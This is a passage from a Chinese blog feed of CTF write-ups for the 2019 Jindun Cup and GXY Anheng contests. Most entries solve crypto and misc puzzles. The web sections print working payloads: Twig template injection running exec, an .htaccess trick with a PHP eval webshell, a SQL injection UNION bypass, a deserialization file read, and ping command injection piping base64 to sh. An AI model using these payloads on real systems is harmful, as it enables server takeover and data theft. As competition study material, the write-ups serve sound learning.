class="meta">&lt;?php</span></span><br><span class="line">$num = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//生成50个伪随机数</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">50</span>; $i++) &#123;</span><br><span class="line">    $num[$i] = rand(<span class="number">0</span>,<span class="number">100000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">31</span>; $i &lt; <span class="number">50</span>; $i++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;第&quot;</span>.($i+<span class="number">1</span>).<span class="string">&quot;个随机数：&quot;</span>.$num[$i].<span class="string">&quot;\t&quot;</span>.<span class="string">&quot;向前数第三个数：&quot;</span>.$num[$i<span class="number">-31</span>].<span class="string">&quot;\t向前数第31个数：&quot;</span>.$num[$i<span class="number">-3</span>].<span class="string">&quot;\t%计算后:&quot;</span>.(($num[$i<span class="number">-31</span>]+$num[$i<span class="number">-3</span>])%<span class="number">100000</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2019/12/30/php-fakerandom-number/TIM截图20200429223554.png" style="zoom: 80%;"><p>可以看到虽然有可能有误差，但误差都为1，gtfly大佬给的提示可以能精度的问题感觉很对</p><p>再看一下windows，是无法用上面的方式预测的，但是可以爆破</p><p>详细看：<a href="https://github.com/Sjord/crack-ezchatter-token">https://github.com/Sjord/crack-ezchatter-token</a></p><p>参考：</p><p><a href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></p><p><a href="https://blog.cfyqy.com/article/5aa79cea.html">https://blog.cfyqy.com/article/5aa79cea.html</a></p><p><a href="https://xz.aliyun.com/t/31">https://xz.aliyun.com/t/31</a></p><p><a href="http://wonderkun.cc/index.html/?p=585">http://wonderkun.cc/index.html/?p=585</a></p><p><a href="https://xz.aliyun.com/t/1520#toc-10">https://xz.aliyun.com/t/1520#toc-10</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ctf </tag>
            
            <tag> 伪随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>河南省第一届金盾杯部分题目writeup</title>
      <link href="2019/12/24/jindun-2019-wp/"/>
      <url>2019/12/24/jindun-2019-wp/</url>
      
        <content type="html"><![CDATA[<p>太菜了！全程懵逼，啥都没干！2333。。。记录下吧！收获很多！</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="waimai2"><a href="#waimai2" class="headerlink" title="waimai2"></a>waimai2</h3><p>打开发现好像一个站，有<code>waimai</code>这个目录，访问发现是个登录框</p><p>任意账号都可以登进去，Twig模板注入(是时候学下SSTI了)，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;ls&quot;)&#125;&#125;&amp;password&#x3D;admin&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure><p><img src="/2019/12/24/jindun-2019-wp/17.png"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="key不在这里"><a href="#key不在这里" class="headerlink" title="key不在这里"></a>key不在这里</h3><p>二维码，扫描，发现是个bing的搜索网址</p><p><img src="/2019/12/24/jindun-2019-wp/20191224111739.png"></p><p>将m参数10进制转ascii字符就行</p><p><img src="/2019/12/24/jindun-2019-wp/20191224111739.png"></p><h3 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0086 1562 2535 5174</span><br><span class="line">bnhn s wwy vffg vffg rrhy fhnv</span><br></pre></td></tr></table></figure><p>提示说flag为将得到的这句话MD5 32位加密的内容</p><p>前一段是中文电报码：<a href="http://code.mcdvisa.com/">解密网址</a>，解出<code>人工智能</code></p><p><img src="/2019/12/24/jindun-2019-wp/20191224113708.png"></p><p>后一段是五笔字，解出来的结果是<code>也要从娃娃抓起</code>，在线五笔输入：<a href="https://www.qqxiuzi.cn/%E5%9C%A8%E7%BA%BF%E4%BA%94%E7%AC%94%E8%BE%93%E5%85%A5%E6%B3%95.htm">网址</a></p><p><img src="/2019/12/24/jindun-2019-wp/20191224115042.png"></p><p>然后MD5加密就可以得到flag</p><p><img src="/2019/12/24/jindun-2019-wp/20191224115500.png"></p><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h3><p>给了一个不知道是啥的文件，多试几次吧，发现是pptx，有密码，用<code>aopr</code>破解</p><p><img src="/2019/12/24/jindun-2019-wp/20191224120951.png"></p><p>破解出密码是<code>9919</code>，打开，发现第七页有文本框</p><p><img src="/2019/12/24/jindun-2019-wp/20191224121214.png"></p><p>改下字体颜色，出现flag</p><p><img src="/2019/12/24/jindun-2019-wp/20191224121350.png"></p><h3 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h3><p>题目是一张jpg图片，用hxd或者strings发现串特殊的字符串</p><p><img src="/2019/12/24/jindun-2019-wp/20191224121823.png"></p><p>base32解密得到flag</p><p><img src="/2019/12/24/jindun-2019-wp/20191224122047.png"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="apple"><a href="#apple" class="headerlink" title="apple"></a>apple</h3><p>给了一段像base64的东西，<code>TkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA=</code>，直接解码会乱码</p><p>脚本意思就是将解出来的乱码与自己的下标加上某个值异或，然后拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s&#x3D;&#39;TkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA&#x3D;&#39;</span><br><span class="line">s&#x3D;base64.b64decode(s)</span><br><span class="line">for i in range(256):</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">k&#x3D;0</span><br><span class="line">for j in s:</span><br><span class="line">res&#x3D;j^(k+i)</span><br><span class="line">flag+&#x3D;chr(res)</span><br><span class="line">k+&#x3D;1</span><br><span class="line">print(i,flag)</span><br></pre></td></tr></table></figure><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><p>附件给了三段密码，<code>clear_info.txt</code> <code>crypt_info.txt</code> <code>true_crypto.txt</code>，<code>true_crypto.txt</code>内容像是DES密码</p><p>发现<code>clear_info.txt</code>和<code>crypt_info.txt</code>内容长度相同都为79，试试异或吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s1&#x3D;open(&quot;clear_info.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">s2&#x3D;open(&quot;crypt_info.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">li1&#x3D;[i for i in s1]</span><br><span class="line">li2&#x3D;[i for i in s2]</span><br><span class="line">for s1,s2 in zip(li1,li2):</span><br><span class="line">s&#x3D;ord(s1)^ord(s2)</span><br><span class="line">flag+&#x3D;chr(s)</span><br><span class="line">print(flag)</span><br><span class="line">fg&#x3D;&quot;&quot;</span><br><span class="line">for tr in flag:</span><br><span class="line">if tr&lt;&#x3D;&quot;Z&quot; and tr&gt;&#x3D;&quot;A&quot;:</span><br><span class="line">fg+&#x3D;&quot;A&quot;</span><br><span class="line">elif tr&lt;&#x3D;&quot;z&quot; and tr&gt;&#x3D;&quot;a&quot;:</span><br><span class="line">fg+&#x3D;&quot;B&quot;</span><br><span class="line">else:</span><br><span class="line">fg+&#x3D;&quot;&quot;</span><br><span class="line">print(fg)</span><br></pre></td></tr></table></figure><p>异或后的结果大小写交叉，试试培根密码吧</p><p><img src="/2019/12/24/jindun-2019-wp/20191224154417.png"></p><p>解密地址：<a href="https://tool.bugku.com/peigen/">网址</a>，解密结果为：<code>DESISAMUSING</code></p><p>Des解下密，解密地址：<a href="https://www.sojson.com/encrypt_des.html">网址</a></p><p><img src="/2019/12/24/jindun-2019-wp/20191224154739.png"></p><h3 id="bj-密文"><a href="#bj-密文" class="headerlink" title="bj-密文"></a>bj-密文</h3><p>打开发现是</p><pre><code>45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46</code></pre><p>只有45，46，32三种数字而其对应的ASCII码正是<code>-</code> <code>.</code> <code> </code></p><p>脚本替换就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;open(&quot;bj.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for tr in s.split(&quot; &quot;):</span><br><span class="line">flag+&#x3D;chr(int(tr))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到摩斯密码，解密得到<code>0X73796E747B6A4848336B4E564D4D573366304263617D</code>，应该是16进制，16进制转字符试试，得到<code>synt&#123;jHH3kNVMMW3f0Bca&#125;</code>，然后是凯撒移位加密，密码为13得到flag，<code>flag&#123;wUU3xAIZZJ3s0Opn&#125;</code></p><h3 id="小明的生日"><a href="#小明的生日" class="headerlink" title="小明的生日"></a>小明的生日</h3><p>给了个MD5，<code>0175501585710a89h5a60dc9ed2f88d7</code>，解不出来，提示说是生日，并且前四位是<code>1997</code>，</p><p>写个脚本跑下吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import difflib</span><br><span class="line"></span><br><span class="line">flag&#x3D;&quot;0175501585710a89h5a60dc9ed2f88d7&quot;</span><br><span class="line"></span><br><span class="line">def md5(key):</span><br><span class="line">    m &#x3D; hashlib.md5()</span><br><span class="line">    m.update(key.encode(&#39;utf-8&#39;))</span><br><span class="line">    return m.hexdigest()</span><br><span class="line"></span><br><span class="line">dic&#x3D;&#123;&#125;</span><br><span class="line">birthday&#x3D;&#39;1997&#39;</span><br><span class="line">for i in range(1,13):</span><br><span class="line">    for j in range(1,32):</span><br><span class="line">       s1&#x3D;&quot;&quot;</span><br><span class="line">        s2&#x3D;&quot;&quot;</span><br><span class="line">        if i&lt;10:</span><br><span class="line">            s1&#x3D;&#39;0&#39;+str(i)</span><br><span class="line">        else:</span><br><span class="line">        s1&#x3D;str(i)</span><br><span class="line">        if j&lt;10:</span><br><span class="line">            s2&#x3D;&#39;0&#39;+str(j)</span><br><span class="line">        else:</span><br><span class="line">        s2&#x3D;str(j)</span><br><span class="line">        bit&#x3D;birthday+s1+s2</span><br><span class="line">        dic[bit]&#x3D;difflib.SequenceMatcher(None, flag,md5(bit)).quick_ratio()</span><br><span class="line">for k in sorted(dic,key&#x3D;dic.__getitem__,reverse&#x3D;True):</span><br><span class="line">print(k,dic[k])</span><br></pre></td></tr></table></figure><p>第一个就是最相似的md5</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXY安恒杯月赛2019部分题目writeup</title>
      <link href="2019/12/21/gxy-2019-wp/"/>
      <url>2019/12/21/gxy-2019-wp/</url>
      
        <content type="html"><![CDATA[<p>我好菜！我好菜！我好菜！重要的事情说三遍，比赛收获很多！！！总结一下，收获了大型比赛的一血，但也就正儿八经的做出这一道！2333….</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="禁止套娃！"><a href="#禁止套娃！" class="headerlink" title="禁止套娃！"></a>禁止套娃！</h3><p>之前做过这种类型，脑子混了！哎！</p><p>WP参见：<a href="http://www.moonback.xyz/2019/11/12/php-nopara-rce/#GXY-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B">http://www.moonback.xyz/2019/11/12/php-nopara-rce/#GXY-安恒月赛</a></p><h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><p>这题就是我拿到一血的题目，小开心！嘻嘻嘻！</p><p>其实这题不难，<code>MIME+.htaccess+检测内容php</code></p><p>bp开两个intruder，一个上传<code>.htaccess</code>(注意MIME)，一个上传图片马(检查<code>&lt;?php?&gt;</code>)，后台会删除上传的文件，所以条件竞争，然后蚁剑连就行</p><p>.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;jpg|png|gif&quot;&gt;  </span><br><span class="line">    SetHandler application&#x2F;x-httpd-php  </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>图片马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h3><p>查看源代码，发现特殊字符串，先base32解密，再base64解密得到：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure><p>告诉我们数据库为user，列有username这列，猜测password的验证是和username分离的</p><p>先fuzz一下sql关键字</p><img src="/2019/12/21/gxy-2019-wp/TIM截图20200516140827.png" style="zoom:67%;"><p>发现过滤了小括号，or,order,=,for,information</p><p>后来看了wp才知道，过滤在sql之后，其实也能试出来，下图成功延时</p><img src="/2019/12/21/gxy-2019-wp/TIM截图20200516143833.png" style="zoom:67%;"><p>这样就相当于没过滤啊，直接sqlmap一把梭，能跑出账号的MD5，但是解不出来</p><p><img src="/2019/12/21/gxy-2019-wp/20191224092021.png"></p><p>既然是password的验证时分离的，我们完全可以伪造一个用户，上面跑不跑无所谓</p><p>用union查询就行，注意列要对应，payload，md5为123456加密后的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&quot;admin&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;%23&amp;pw&#x3D;123456</span><br></pre></td></tr></table></figure><p>为啥可以这样？</p><p>后端将接收到的password md5加密与上次查询的结果比较，我们就可以联合查询伪造一个用户进行绕过</p><h3 id="无情的报菜名机器"><a href="#无情的报菜名机器" class="headerlink" title="无情的报菜名机器"></a>无情的报菜名机器</h3><p>反序列化，dirsearch扫到<code>index.php~</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileReader</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Filename;</span><br><span class="line"><span class="keyword">public</span> $start;</span><br><span class="line"><span class="keyword">public</span> $max_length;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/bcm.txt&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;start = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;max_length = <span class="number">72</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/fake_f1ag.php&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;start = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;max_length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$data = file_get_contents(<span class="keyword">$this</span>-&gt;Filename, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="keyword">$this</span>-&gt;start, <span class="keyword">$this</span>-&gt;max_length);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#123;|\&#125;/&quot;</span>, $data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t read flag!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hack!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_REQUEST[<span class="string">&#x27;exp&#x27;</span>];</span><br><span class="line">$e = unserialize($exp);</span><br><span class="line"><span class="keyword">echo</span> $e-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">$exp = <span class="keyword">new</span> FileReader();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先要绕过对exp的正则，发现exp可以通过POST提交过去，很容易绕过，其次要绕过__wakeup函数，这个直接改下数字大小就行，读文件的时候可以用<code>php://filter</code>进行加密绕过对<code>&#123;&#125;</code>的过滤</p><p>payload:</p><pre><code>http://183.129.189.60:10004/index.php?exp=1POST:exp=O:10:&quot;FileReader&quot;:4:&#123;s:8:&quot;Filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:1000;&#125;</code></pre><h3 id="I-can-ping-you"><a href="#I-can-ping-you" class="headerlink" title="I can ping you!"></a>I can ping you!</h3><p>题目是看不到源码的，咱们直接拿源码来看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">$ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line"><span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了一大堆东西</p><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;cat<span class="variable">$IFS</span>`ls`</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=||<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure><p><code>Y2F0IGZsYWcucGhw</code>是<code>cat flag.php</code>的意思</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h3><p>这题直接binwalk压缩包会卡住，敲下回车就行，分离出三个文件</p><p><img src="/2019/12/21/gxy-2019-wp/20191222110458.png"></p><p><code>fo.txt</code>里面有与佛论禅加密，拿到<a href="keyfc.net/bbs/tools/tudoucode.aspx">这里</a>解密一下就可以得到flag</p><p>其实这题的真正考点是zip伪加密，用binwalk分离出的<code>0.zip</code>是经过zip伪加密的，我是用的winrar修复的，比对一下两个文件，发现只有一处不同，即全局方式位标记不同(用于区分是否有加密)，<code>00 00</code>代表无加密，<code>00 09</code>代表有加密，因此也可以手动修改，关于zip伪加密的，参见：<a href="https://www.cnblogs.com/xishaonian/p/7713657.html">link</a><br><img src="/2019/12/21/gxy-2019-wp/20191222111415.png"></p><h3 id="gakki"><a href="#gakki" class="headerlink" title="gakki"></a>gakki</h3><p>解压发现是一张图片，binwalk一下，分离出压缩包<br><img src="/2019/12/21/gxy-2019-wp/20191222112643.png"></p><p>是有加密的，没什莫思路，是不是简单的密码？试试呗</p><p><img src="/2019/12/21/gxy-2019-wp/20191222113136.png"></p><p>密码为8864，打开<code>flag.txt</code>发现好像乱码的东西</p><p><img src="/2019/12/21/gxy-2019-wp/20191222113455.png"></p><p>神魔加密呢？不算是加密</p><p><img src="/2019/12/21/gxy-2019-wp/20191222120106.png"></p><p>这些字符其实是由flag的内容，顺序是按照出现的次数从大到小排序，上脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp=open(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print(fp)</span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> fp:</span><br><span class="line">dic[tr]=fp.count(tr)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> sorted(dic,key=dic.__getitem__,reverse=<span class="literal">True</span>):</span><br><span class="line">print(k,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>人生苦短我用python</p><h3 id="SXMgdGhpcyBiYXNlPw"><a href="#SXMgdGhpcyBiYXNlPw" class="headerlink" title="SXMgdGhpcyBiYXNlPw=="></a>SXMgdGhpcyBiYXNlPw==</h3><p>本题是base64隐写，题目内容</p><p>关于base64隐写的内容，参见这位<a href="https://www.tr0y.wang/2017/06/14/Base64steg/">大佬的blog</a></p><p>这道题直接用脚本跑就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">bin_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;code.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64=<span class="string">&quot;&quot;</span>.join(line.split())</span><br><span class="line">        rowb64=<span class="string">&quot;&quot;</span>.join(str(base64.b64encode(base64.b64decode(stegb64)),<span class="string">&#x27;utf-8&#x27;</span>).split())</span><br><span class="line">        offset=abs(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[<span 